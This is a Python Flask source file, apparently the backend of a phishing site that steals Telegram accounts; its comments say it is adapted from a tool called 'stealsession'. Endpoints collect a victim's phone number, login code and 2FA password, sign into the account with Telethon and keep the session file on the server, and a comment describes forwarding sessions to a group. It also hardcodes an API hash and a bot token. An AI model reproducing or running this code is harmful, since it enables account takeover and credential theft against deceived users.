from flask import Flask, request, jsonify, render_template, redirect, url_for
from flask_cors import CORS
import os
import asyncio
import json
from datetime import datetime
import sqlite3
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError
import threading
import time

app = Flask(__name__)
CORS(app)

# Конфигурация из stealsession
API_ID = 22329270
API_HASH = 'd84bc602b8436566fbf1f264ea3821b2'
ADMIN_ID = -1003133892967
BOT_TOKEN = '8106143953:AAFMnmEDmKqSRX6szC7mUN6rVQSdlN4uqoM'

# Создаем папки если их нет
os.makedirs('session', exist_ok=True)
os.makedirs('data', exist_ok=True)

# Инициализация базы данных
def init_db():
    conn = sqlite3.connect('data/database.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            phone TEXT,
            date TEXT
        )
    ''')
    conn.commit()
    conn.close()

# Класс для работы с пользователями (из stealsession)
class User:
    def __init__(self, user_id=None):
        self._sql_path = './data/database.db'
        self.conn = sqlite3.connect(database=self._sql_path)
        self.cursor = self.conn.cursor()
        
        if user_id is not None:
            self.cursor.execute('SELECT * FROM users WHERE user_id = ?', [user_id])
            user = self.cursor.fetchone()
            if user:
                self.user_id = user[0]
                self.username = user[1]
                self.phone = user[2]
                self.date = user[3]

    def join_users(self, user_id, username):
        status = False
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", [user_id])
        row = self.cursor.fetchall()
        
        if len(row) == 0:
            user_data = [user_id, f"{username}", 'NOT', datetime.now()]
            self.cursor.execute("INSERT INTO users VALUES (?,?,?,?)", user_data)
            self.conn.commit()
            status = True
        return status

    def update_phone(self, phone):
        self.cursor.execute("UPDATE users SET phone = ? WHERE user_id = ?", [phone, self.user_id])
        self.conn.commit()
        return True

# Класс для работы с Telegram клиентом (из stealsession)
class ClientTG:
    def __init__(self, phone=None):
        self.client = TelegramClient(
            session=f'./session/{phone[1:]}.session',
            api_id=API_ID,
            api_hash=API_HASH,
            device_model="Iphone",
            system_version="6.12.0",
            app_version="10 P (28)"
        )
        if phone is not None:
            self.phone = phone

# Хранилище для активных сессий
active_sessions = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/code-verification')
def code_verification():
    return render_template('code-verification.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/request_code', methods=['POST'])
def request_code():
    try:
        data = request.get_json()
        phone = data.get('phone')
        
        if not phone:
            return jsonify({'error': 'Номер телефона не предоставлен'}), 400
        
        # Проверяем, существует ли уже сессия
        session_file = f'./session/{phone[1:]}.session'
        if os.path.exists(session_file):
            return jsonify({'error': 'Сессия уже существует'}), 400
        
        # Создаем клиент и отправляем код
        client = ClientTG(phone=phone)
        
        async def send_code_async():
            try:
                await client.client.connect()
                send_code = await client.client.send_code_request(phone=phone)
                await client.client.disconnect()
                
                # Сохраняем данные сессии
                active_sessions[phone] = {
                    'phone_code_hash': send_code.phone_code_hash,
                    'timestamp': time.time()
                }
                
                return {'success': True, 'message': 'Код отправлен'}
            except FloodWaitError as e:
                return {'error': f'Ошибка: {e}'}
            except Exception as e:
                return {'error': f'Ошибка отправки кода: {str(e)}'}
        
        # Запускаем асинхронную функцию
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(send_code_async())
        loop.close()
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'error': f'Ошибка: {str(e)}'}), 500

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    try:
        data = request.get_json()
        phone = data.get('phone')
        code = data.get('code')
        password = data.get('password')
        
        if not phone or not code:
            return jsonify({'error': 'Недостаточно данных'}), 400
        
        if phone not in active_sessions:
            return jsonify({'error': 'Сессия не найдена'}), 400
        
        client = ClientTG(phone=phone)
        
        async def verify_code_async():
            try:
                await client.client.connect()
                
                # Пытаемся войти с кодом
                try:
                    await client.client.sign_in(
                        phone=phone, 
                        code=code, 
                        phone_code_hash=active_sessions[phone]['phone_code_hash']
                    )
                except SessionPasswordNeededError:
                    if not password:
                        return {'error': 'Требуется пароль 2FA', 'need_password': True}
                    await client.client.sign_in(phone=phone, password=password)
                
                # Если успешно, сохраняем сессию
                session_file = f'./session/{phone[1:]}.session'
                if os.path.exists(session_file):
                    # Отправляем сессию в группу (симуляция)
                    print(f"✅ Сессия получена для {phone}")
                    
                    # Удаляем из активных сессий
                    del active_sessions[phone]
                    
                    return {'success': True, 'message': 'Авторизация успешна'}
                else:
                    return {'error': 'Ошибка сохранения сессии'}
                    
            except PhoneCodeInvalidError:
                return {'error': 'Неверный код'}
            except Exception as e:
                return {'error': f'Ошибка авторизации: {str(e)}'}
            finally:
                if client.client.is_connected():
                    await client.client.disconnect()
        
        # Запускаем асинхронную функцию
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(verify_code_async())
        loop.close()
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'error': f'Ошибка: {str(e)}'}), 500

@app.route('/api/resend_code', methods=['POST'])
def resend_code():
    try:
        data = request.get_json()
        phone = data.get('phone')
        
        if not phone:
            return jsonify({'error': 'Номер телефона не предоставлен'}), 400
        
        # Повторно отправляем код
        client = ClientTG(phone=phone)
        
        async def resend_code_async():
            try:
                await client.client.connect()
                send_code = await client.client.send_code_request(phone=phone)
                await client.client.disconnect()
                
                # Обновляем данные сессии
                active_sessions[phone] = {
                    'phone_code_hash': send_code.phone_code_hash,
                    'timestamp': time.time()
                }
                
                return {'success': True, 'message': 'Код отправлен повторно'}
            except Exception as e:
                return {'error': f'Ошибка отправки кода: {str(e)}'}
        
        # Запускаем асинхронную функцию
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(resend_code_async())
        loop.close()
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'error': f'Ошибка: {str(e)}'}), 500

if __name__ == '__main__':
    init_db()
    app.run(debug=True, host='0.0.0.0', port=5000)
